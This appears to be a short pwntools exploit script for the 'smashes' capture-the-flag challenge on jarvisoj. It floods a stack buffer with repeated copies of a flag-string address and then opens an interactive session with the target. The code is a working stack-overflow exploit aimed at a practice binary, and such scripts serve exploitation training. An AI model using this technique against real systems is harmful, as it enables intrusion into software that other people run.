from pwn import *
context.log_level='debug'
p=process('./smashes')
#p=remote('pwn.jarvisoj.com',9877)
flag=0x400d21
p.recv()
payload=p64(flag)*300
p.sendline(payload)
p.interactive()
